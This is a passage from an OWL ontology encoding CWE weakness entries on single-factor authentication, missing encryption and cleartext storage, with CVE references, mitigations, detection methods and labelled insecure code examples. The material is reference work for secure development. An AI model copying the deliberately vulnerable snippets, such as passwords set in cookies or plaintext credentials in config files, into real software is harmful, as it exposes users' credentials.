- Fuzz Tester
- Framework-based Fuzzer
Cost effective for partial coverage:
- Forced Path Execution"^^xsd:string, 
                 rdfs:comment "Analysis with Manual Results Interpretation"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Fuzz Tester
- Framework-based Fuzzer
Cost effective for partial coverage:
- Forced Path Execution"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Configuration Checker"^^xsd:string, 
                 rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Configuration Checker"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Source code Weakness Analyzer
- Context-configured Source Code Weakness Analyzer"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Source code Weakness Analyzer
- Context-configured Source Code Weakness Analyzer"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Focused Manual Spotcheck - Focused manual analysis of source
- Manual Source Code Review (not inspections)"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Focused Manual Spotcheck - Focused manual analysis of source
- Manual Source Code Review (not inspections)"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-308_Use_of_Single-factor_Authentication

    Annotations: 
        rdfs:comment "The use of single-factor authentication can lead to unnecessary risk of compromise when compared with the benefits of a dual-factor authentication scheme."^^xsd:string,
        rdfs:comment "While the use of multiple authentication schemes is simply piling on more complexity on top of authentication, it is inestimably valuable to have such measures of redundancy. The use of weak, reused, and common passwords is rampant on the internet. Without the added protection of multiple authentication schemes, a single mistake can result in the compromise of an account. For this reason, if multiple schemes are possible and also easy to use, they should be implemented and required."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     ID  "308"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "If the secret in a single-factor authentication scheme gets compromised, full authentication is possible."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Use multiple independent authentication schemes, which ensures that -- if one of the methods is compromised -- the system itself is still likely safe from compromise."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "In both of these examples, a user is logged in if their given password matches a stored password:

Example Language: C  /* (bad code) */ 
unsigned char *check_passwd(char *plaintext) {
ctext = simple_digest(\"sha1\",plaintext,strlen(plaintext), ... );
//Login if hash matches stored hash 
if (equal(ctext, secret_password())) {
login_user();
}
}

Example Language: Java /* (bad code) */
String plainText = new String(plainTextIn);
MessageDigest encer = MessageDigest.getInstance(\"SHA\");
encer.update(plainTextIn);
byte[] digest = password.digest();
//Login if hash matches stored hash 
if (equal(digest,secret_password())) {
login_user();
}
This code fails to incorporate more than one method of authentication. If an attacker can steal or guess a user's password, they are given full access to their account. Note this code also exhibits CWE-328 (Reversible One-Way Hash) and CWE-759 (Use of a One-Way Hash without a Salt)."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-311_Missing_Encryption_of_Sensitive_Data

    Annotations: 
        rdfs:comment "The lack of proper data encryption passes up the guarantees of confidentiality, integrity, and accountability that properly implemented encryption conveys."^^xsd:string,
        rdfs:comment "The software does not encrypt sensitive or critical information before storage or transmission."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Passwords transmitted in cleartext."^^xsd:string
                 
                 references  CVE-2002-1949,
     
     Annotations: rdfs:comment "Product transmits Blowfish encryption key in cleartext."^^xsd:string
                 
                 references  CVE-2004-1852,
     
     Annotations: rdfs:comment "Product sends file with cleartext passwords in e-mail message intended for diagnostic purposes."^^xsd:string
                 
                 references  CVE-2005-3140,
     
     Annotations: rdfs:comment "Product sends passwords in cleartext to a log server."^^xsd:string
                 
                 references  CVE-2007-4786,
     
     Annotations: rdfs:comment "Chain: cleartext transmission of the MD5 hash of password enables attacks against a server that is susceptible to replay (CWE-294)."^^xsd:string
                 
                 references  CVE-2007-4961,
     
     Annotations: rdfs:comment "Backup routine sends password in cleartext in email."^^xsd:string
                 
                 references  CVE-2007-5626,
     
     Annotations: rdfs:comment "login credentials stored unencrypted in a registry key"^^xsd:string
                 
                 references  CVE-2007-5778,
     
     Annotations: rdfs:comment "SCADA product uses HTTP Basic Authentication, which is not encrypted"^^xsd:string
                 
                 references  CVE-2008-0174,
     
     Annotations: rdfs:comment "Printer sends configuration information, including administrative password, in cleartext."^^xsd:string
                 
                 references  CVE-2008-0374,
     
     Annotations: rdfs:comment "storage of a secret key in cleartext in a temporary file"^^xsd:string
                 
                 references  CVE-2008-1567,
     
     Annotations: rdfs:comment "Product sends password hash in cleartext in violation of intended policy."^^xsd:string
                 
                 references  CVE-2008-3289,
     
     Annotations: rdfs:comment "Chain: Use of HTTPS cookie without \"secure\" flag causes it to be transmitted across unencrypted HTTP."^^xsd:string
                 
                 references  CVE-2008-4122,
     
     Annotations: rdfs:comment "Remote management feature sends sensitive information including passwords in cleartext."^^xsd:string
                 
                 references  CVE-2008-4390,
     
     Annotations: rdfs:comment "storage of unencrypted passwords in a database"^^xsd:string
                 
                 references  CVE-2008-6157,
     
     Annotations: rdfs:comment "product stores a password in cleartext in memory"^^xsd:string
                 
                 references  CVE-2008-6828,
     
     Annotations: rdfs:comment "chat program disables SSL in some circumstances even when the user says to use SSL."^^xsd:string
                 
                 references  CVE-2009-0152,
     
     Annotations: rdfs:comment "storage of unencrypted passwords in a database"^^xsd:string
                 
                 references  CVE-2009-0964,
     
     Annotations: rdfs:comment "password stored in cleartext in a file with insecure permissions"^^xsd:string
                 
                 references  CVE-2009-1466,
     
     Annotations: rdfs:comment "Chain: product uses an incorrect public exponent when generating an RSA key, which effectively disables the encryption"^^xsd:string
                 
                 references  CVE-2009-1603,
     
     Annotations: rdfs:comment "password and username stored in cleartext in a cookie"^^xsd:string
                 
                 references  CVE-2009-2272,
     
     Annotations: rdfs:comment "Screen Temporary Files for Sensitive Information"^^xsd:string
                 
                 related_attack_patterns  CAPEC-155,
     
     Annotations: rdfs:comment "Sniffing Attacks"^^xsd:string
                 
                 related_attack_patterns  CAPEC-157,
     
     Annotations: rdfs:comment "Sniffing Network Traffic"^^xsd:string
                 
                 related_attack_patterns  CAPEC-158,
     
     Annotations: rdfs:comment "Lifting Sensitive Data Embedded in Cache"^^xsd:string
                 
                 related_attack_patterns  CAPEC-204,
     
     Annotations: rdfs:comment "Accessing/Intercepting/Modifying HTTP Cookies"^^xsd:string
                 
                 related_attack_patterns  CAPEC-31,
     
     Annotations: rdfs:comment "Retrieve Embedded Sensitive Data"^^xsd:string
                 
                 related_attack_patterns  CAPEC-37,
     
     Annotations: rdfs:comment "Harvesting Information via API Event Monitoring"^^xsd:string
                 
                 related_attack_patterns  CAPEC-383,
     
     Annotations: rdfs:comment "Application API Message Manipulation via Man-in-the-Middle"^^xsd:string
                 
                 related_attack_patterns  CAPEC-384,
     
     Annotations: rdfs:comment "Transaction or Event Tampering via Application API Manipulation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-385,
     
     Annotations: rdfs:comment "Application API Navigation Remapping"^^xsd:string
                 
                 related_attack_patterns  CAPEC-386,
     
     Annotations: rdfs:comment "Navigation Remapping To Propagate Malicious Content"^^xsd:string
                 
                 related_attack_patterns  CAPEC-387,
     
     Annotations: rdfs:comment "Application API Button Hijacking"^^xsd:string
                 
                 related_attack_patterns  CAPEC-388,
     
     Annotations: rdfs:comment "Content Spoofing Via Application API Manipulation"^^xsd:string
                 
                 related_attack_patterns  CAPEC-389,
     
     Annotations: rdfs:comment "Signature Spoofing by Mixing Signed and Unsigned Content"^^xsd:string
                 
                 related_attack_patterns  CAPEC-477,
     
     Annotations: rdfs:comment "Sniff Application Code"^^xsd:string
                 
                 related_attack_patterns  CAPEC-65,
     ID  "311"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Ensure that encryption is properly integrated into the system design, including but not necessarily limited to:
- Encryption that is needed to store or transmit private data of the users of the system
- Encryption that is needed to protect the system itself from unauthorized disclosure or tampering
Identify the separate needs and contexts for encryption:
- One-way (i.e., only the user or recipient needs to have the key). This can be achieved using public key cryptography, or other techniques in which the encrypting party (i.e., the software) does not need to have access to a private key.
- Two-way (i.e., the encryption can be automatically performed on behalf of a user, but the key must be available so that the plaintext can be automatically recoverable by that user). This requires storage of the private key in a format that is recoverable only by the user (or perhaps by the operating system) in a way that cannot be recovered by others.
Using threat modeling or other techniques, assume that data can be compromised through a separate vulnerability or weakness, and determine where encryption will be most effective. Ensure that data that should be private is not being inadvertently exposed using weaknesses such as insecure permissions (CWE-732). [REF-7]"^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.
For example, US government systems require FIPS 140-2 certification.
Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.
Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]"^^xsd:string, 
                 rdfs:comment "Strategy: Separation of Privilege

Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string, 
                 rdfs:comment "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
Formal Methods / Correct-By-Construction
Cost effective for partial coverage:
Attack Modeling
Effectiveness: High"^^xsd:string
                 
                 architecture_or_design_review  ""^^xsd:string,
     
     Annotations: rdfs:comment "Automated measurement of the entropy of an input/output source may indicate the use or lack of encryption, but human analysis is still required to distinguish intentionally-unencrypted data (e.g. metadata) from sensitive data."^^xsd:string
                 
                 automated_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Omitting the use of encryption in any program which transfers data over a network of any kind should be considered on par with delivering the data sent to each user on the local networks of both the sender and receiver. Worse, this omission allows for the injection of data into a stream of communication between two parties -- with no means for the victims to separate valid data from invalid. In this day of widespread network attacks and password collection sniffers, it is an unnecessary risk to omit encryption from the design of any system which might benefit from it."^^xsd:string
                 
                 confidentiality  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "If the application does not use a secure channel, such as SSL, to exchange sensitive information, it is possible for an attacker with access to the network traffic to sniff packets from the connection and uncover the data. This attack is not technically difficult, but does require physical access to some portion of the network over which the sensitive data travels. This access is usually somewhere near where the user is connected to the network (such as a colleague on the company network) but can be anywhere along the path from the user to the end server."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. This code writes a user's login information to a cookie so the user does not have to login again later.

(bad code)
Example Language: PHP 
function persistLogin($username, $password){
$data = array(\"username\" => $username, \"password\"=> $password);
setcookie (\"userdata\", $data);
}
The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.

Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315)."^^xsd:string, 
                 rdfs:comment "Example 2. The following code attempts to establish a connection, read in a password, then store it to a buffer.

(bad code)
Example Language: C 
server.sin_family = AF_INET; hp = gethostbyname(argv[1]);
if (hp==NULL) error(\"Unknown host\");
memcpy( (char *)&server.sin_addr,(char *)hp->h_addr,hp->h_length);
if (argc < 3) port = 80;
else port = (unsigned short)atoi(argv[3]);
server.sin_port = htons(port);
if (connect(sock, (struct sockaddr *)&server, sizeof server) < 0) error(\"Connecting\");
...
while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {

write(dfd,password_buffer,n);
...
While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors."^^xsd:string, 
                 rdfs:comment "Example 3. The following code attempts to establish a connection to a site to communicate sensitive information.

(bad code)
Example Language: Java 
try {
URL u = new URL(\"http://www.secret.example.org/\");
HttpURLConnection hu = (HttpURLConnection) u.openConnection();
hu.setRequestMethod(\"PUT\");
hu.connect();
OutputStream os = hu.getOutputStream();
hu.disconnect();
}
catch (IOException e) {

//... 
}
Though a connection is successfully made, the connection is unencrypted and it is possible that all sensitive data sent to or received from the server will be read by unintended actors."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Automated Results Interpretation

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Web Application Scanner
Web Services Scanner
Database Scanners
Effectiveness: SOAR Partial"^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis with Manual Results Interpretation

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Network Sniffer
Cost effective for partial coverage:
Fuzz Tester
Framework-based Fuzzer
Automated Monitored Execution
Man-in-the-middle attack tool
Effectiveness: High"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Attack Surface Reduction

Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.
Effectiveness: Defense in Depth

Note: This makes it easier to spot places in the code where data is being used that is unencrypted."^^xsd:string, 
                 rdfs:comment "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Omitting the use of encryption in any program which transfers data over a network of any kind should be considered on par with delivering the data sent to each user on the local networks of both the sender and receiver. Worse, this omission allows for the injection of data into a stream of communication between two parties -- with no means for the victims to separate valid data from invalid. In this day of widespread network attacks and password collection sniffers, it is an unnecessary risk to omit encryption from the design of any system which might benefit from it."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The characterizaton of sensitive data often requires domain-specific understanding, so manual methods are useful. However, manual efforts might not achieve desired code coverage within limited time constraints. Black box methods may produce artifacts (e.g. stored data or unencrypted network transfer) that require manual evaluation.
Effectiveness: High"^^xsd:string
                 
                 manual_analysis  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Clearly specify which data or resources are valuable enough that they should be protected by encryption. Require that any transmission or storage of this data/resource should use well-vetted encryption algorithms."^^xsd:string
                 
                 requirements  ""^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Context-configured Source Code Weakness Analyzer
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Binary or Bytecode

According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Analysis - Source Code

According to SOAR, the following detection techniques may be useful:
Highly cost effective:
Focused Manual Spotcheck - Focused manual analysis of source
Manual Source Code Review (not inspections)
Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string
    
    
Individual: CWE-312_Cleartext_Storage_of_Sensitive_Information

    Annotations: 
        rdfs:comment "Because the information is stored in cleartext, attackers could potentially read it. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information."^^xsd:string,
        rdfs:comment "Terminology
Different people use \"cleartext\" and \"plaintext\" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding)."^^xsd:string,
        rdfs:comment "The application stores sensitive information in cleartext within a resource that might be accessible to another control sphere."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Plaintext credentials in world-readable file."^^xsd:string
                 
                 references  CVE-2001-1481,
     
     Annotations: rdfs:comment "Usernames/passwords in cleartext in cookies."^^xsd:string
                 
                 references  CVE-2001-1536,
     
     Annotations: rdfs:comment "Default configuration has cleartext usernames/passwords in cookie."^^xsd:string
                 
                 references  CVE-2001-1537,
     
     Annotations: rdfs:comment "Decrypted copy of a message written to disk given a combination of options and when user replies to an encrypted message."^^xsd:string
                 
                 references  CVE-2002-1696,
     
     Annotations: rdfs:comment "Admin password in plaintext in a cookie."^^xsd:string
                 
                 references  CVE-2002-1800,
     
     Annotations: rdfs:comment "Plaintext storage of private key and passphrase in log file when user imports the key."^^xsd:string
                 
                 references  CVE-2004-2397,
     
     Annotations: rdfs:comment "Password in cleartext in config file."^^xsd:string
                 
                 references  CVE-2005-1828,
     
     Annotations: rdfs:comment "Authentication information stored in cleartext in a cookie."^^xsd:string
                 
                 references  CVE-2005-2160,
     
     Annotations: rdfs:comment "Password in cleartext in config file."^^xsd:string
                 
                 references  CVE-2005-2209,
     
     Annotations: rdfs:comment "login credentials stored unencrypted in a registry key"^^xsd:string
                 
                 references  CVE-2007-5778,
     
     Annotations: rdfs:comment "SCADA product uses HTTP Basic Authentication, which is not encrypted"^^xsd:string
                 
                 references  CVE-2008-0174,
     
     Annotations: rdfs:comment "storage of a secret key in cleartext in a temporary file"^^xsd:string
                 
                 references  CVE-2008-1567,
     
     Annotations: rdfs:comment "storage of unencrypted passwords in a database"^^xsd:string
                 
                 references  CVE-2008-6157,
     
     Annotations: rdfs:comment "product stores a password in cleartext in memory"^^xsd:string
                 
                 references  CVE-2008-6828,
     
     Annotations: rdfs:comment "chat program disables SSL in some circumstances even when the user says to use SSL."^^xsd:string
                 
                 references  CVE-2009-0152,
     
     Annotations: rdfs:comment "storage of unencrypted passwords in a database"^^xsd:string
                 
                 references  CVE-2009-0964,
     
     Annotations: rdfs:comment "password stored in cleartext in a file with insecure permissions"^^xsd:string
                 
                 references  CVE-2009-1466,
     
     Annotations: rdfs:comment "Chain: product uses an incorrect public exponent when generating an RSA key, which effectively disables the encryption"^^xsd:string
                 
                 references  CVE-2009-1603,
     
     Annotations: rdfs:comment "password and username stored in cleartext in a cookie"^^xsd:string
                 
                 references  CVE-2009-2272,
     
     Annotations: rdfs:comment "Retrieve Embedded Sensitive Data"^^xsd:string
                 
                 related_attack_patterns  CAPEC-37,
     ID  "312"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "An attacker with access to the system could read sensitive information stored in cleartext."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. The following code excerpt stores a plaintext user account ID in a browser cookie.

(bad code)
Example Language: Java 
response.addCookie( new Cookie(\"userAccountID\", acctID);
Because the account ID is in plaintext, the user's account information is exposed if their computer is compromised by an attacker."^^xsd:string, 
                 rdfs:comment "Example 2. This code writes a user's login information to a cookie so the user does not have to login again later.

(bad code)
Example Language: PHP 
function persistLogin($username, $password){
$data = array(\"username\" => $username, \"password\"=> $password);
setcookie (\"userdata\", $data);
}
The code stores the user's username and password in plaintext in a cookie on the user's machine. This exposes the user's login information if their computer is compromised by an attacker. Even if the user's machine is not compromised, this weakness combined with cross-site scripting (CWE-79) could allow an attacker to remotely copy the cookie.

Also note this example code also exhibits Plaintext Storage in a Cookie (CWE-315)."^^xsd:string, 
                 rdfs:comment "Example 3. The following code attempts to establish a connection, read in a password, then store it to a buffer.

(bad code)
Example Language: C 
server.sin_family = AF_INET; hp = gethostbyname(argv[1]);
if (hp==NULL) error(\"Unknown host\");
memcpy( (char *)&server.sin_addr,(char *)hp->h_addr,hp->h_length);
if (argc < 3) port = 80;
else port = (unsigned short)atoi(argv[3]);
server.sin_port = htons(port);
if (connect(sock, (struct sockaddr *)&server, sizeof server) < 0) error(\"Connecting\");
...
while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {

write(dfd,password_buffer,n);
...
While successful, the program does not encrypt the data before writing it to a buffer, possibly exposing it to unauthorized actors."^^xsd:string, 
                 rdfs:comment "Example 4. The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.

This Java example shows a properties file with a plaintext username / password pair.

(bad code)
Example Language: Java 

# Java Web App ResourceBundle properties file 
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...
The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.

(bad code)
Example Language: ASP.NET 
...
<connectionStrings>
<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />
</connectionStrings>
...
Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     paradigms  "Mobile"^^xsd:string
    
    
Individual: CWE-313_Cleartext_Storage_in_a_File_or_on_Disk

    Annotations: 
        rdfs:comment "Terminology

Different people use \"cleartext\" and \"plaintext\" to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding)."^^xsd:string,
        rdfs:comment "The application stores sensitive information in cleartext in a file, or on disk."^^xsd:string,
        rdfs:comment "The sensitive information could be read by attackers with access to the file, or with physical or administrator access to the raw disk. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "Cleartext credentials in world-readable file."^^xsd:string
                 
                 references  CVE-2001-1481,
     
     Annotations: rdfs:comment "Decrypted copy of a message written to disk given a combination of options and when user replies to an encrypted message."^^xsd:string
                 
                 references  CVE-2002-1696,
     
     Annotations: rdfs:comment "Cleartext storage of private key and passphrase in log file when user imports the key."^^xsd:string
                 
                 references  CVE-2004-2397,
     
     Annotations: rdfs:comment "Password in cleartext in config file."^^xsd:string
                 
                 references  CVE-2005-1828,
     
     Annotations: rdfs:comment "Password in cleartext in config file."^^xsd:string
                 
                 references  CVE-2005-2209,
     ID  "313"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.

This Java example shows a properties file with a cleartext username / password pair.

(bad code)
Example Language: Java 

# Java Web App ResourceBundle properties file 
...
webapp.ldap.username=secretUsername
webapp.ldap.password=secretPassword
...
The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.

(bad code)
Example Language: ASP.NET 
...
<connectionStrings>
<add name=\"ud_DEV\" connectionString=\"connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;\" providerName=\"System.Data.Odbc\" />
</connectionStrings>
...
Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
